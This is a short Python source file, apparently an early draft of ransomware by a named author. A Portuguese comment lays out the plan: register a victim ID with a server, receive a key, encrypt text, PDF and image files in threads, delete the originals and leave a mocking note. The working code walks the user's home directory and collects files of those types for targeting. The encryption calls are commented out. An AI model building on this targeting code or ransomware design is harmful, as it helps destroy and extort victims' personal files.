#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

#from AES.crypt import *
import os


'''
    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''


def menu():
    home=os.environ['HOME']
    print('Partindo de: '+str(home))
    # lista com todos os arquivos #
    retorno=listar(home)
    print(retorno)
    #print(str(retorno).replace("',",'\n').replace("'",'').replace('[','').replace(']',''))


def listar(diretorio):
    # cria uma lista onde será adicionado o nome dos arquivos #
    arquivos=[]
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            a=caminho+'/'+arq
            extensao=os.path.splitext(a)
            if(extensao[1]=='.pdf' or
                extensao[1]=='.txt' or
                extensao[1]=='.jpeg' or
                extensao[1]=='.jpg' or
                extensao[1]=='.png' or
                extensao[1]=='.jpeg'):
                arquivos.append(a)
    return arquivos




if __name__=="__main__":
    print('começando')
    menu()



'''with open('', 'rb') as in_file, open('', 'wb') as out_file:
    encrypt(in_file, out_file, 'password')
with open('FB_IMG_1495038132603.jpg.crypto', 'rb') as in_file, open('FB_IMG_1495038132603.jpg', 'wb') as out_file:
    decrypt(in_file, out_file, "password")
'''
